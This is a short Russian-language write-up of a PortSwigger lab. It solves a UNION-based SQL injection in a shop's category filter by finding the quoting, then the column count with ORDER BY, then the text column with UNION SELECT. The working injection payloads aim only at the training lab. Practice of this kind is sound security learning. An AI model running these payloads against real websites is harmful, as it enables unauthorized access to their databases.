---
title: "SQL injection UNION attack, finding a column containing text"
date: 2025-06-19
tags: [sql, writeup]
---
**Source:** [Coffee Cube](https://t.me/coffee_cube)  
**Lab:** [PortSwigger](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-finding-columns-with-a-useful-data-type/sql-injection/union-attacks/lab-find-column-containing-text)


## Scope
```
https://0ae10098047afc77a0e79a58006d0024.web-security-academy.net/
```

В данной лабе есть уязвимый к **SQL injection** фильтр категории. Нужно найти столбец, в котором используются строки.


## Solution

Из задания известно, что **sqli** находится в фильтре категории, поэтому возьму `URL` и буду работать с ним:

```
https://0ae10098047afc77a0e79a58006d0024.web-security-academy.net/filter?category=Accessories
```

Теперь нужно найти обрамление параметра. Предположу, что запрос в БД выглядит следующим образом:

```sql
SELECT * FROM table WHERE category = 'Accessories'
```

Поверю это, передав следующий пейлоад:

```
Accessories' and false-- -
```

Товары не отобразились, значит я нашел обрамление. 

![IMG](/assets/images/IMG_SQL-injection-UNION-attack-finding-a-column-containing-text/1.png){: height="200" .align-center}

Далее найду количество колонок с помощью `ORDER BY`:

```
Accessories' ORDER BY 4-- -ошибка
Accessories' ORDER BY 3-- -ОК
```

Значит в БД 3 колонки. Подставлю `UNION`, чтобы вывести данные на страницу:

```
Accessories' UNION SELECT NULL, NULL, NULL-- -ОК
```

Подставлю свои данные вместо `NULL`:

```
Accessories' UNION SELECT NULL, NULL, NULL-- -
```

Только сейчас заметил, что нужно вывести определенную строку) Ну ок.

![IMG](/assets/images/IMG_SQL-injection-UNION-attack-finding-a-column-containing-text/2.png){: height="200" .align-center}


```
Accessories' UNION SELECT 'xCxqZ9', NULL, NULL-- -ошибка
Accessories' UNION SELECT NULL, 'xCxqZ9', NULL-- -ОК
```

![IMG](/assets/images/IMG_SQL-injection-UNION-attack-finding-a-column-containing-text/3.png){: height="200" .align-center}

Лаба решена:3
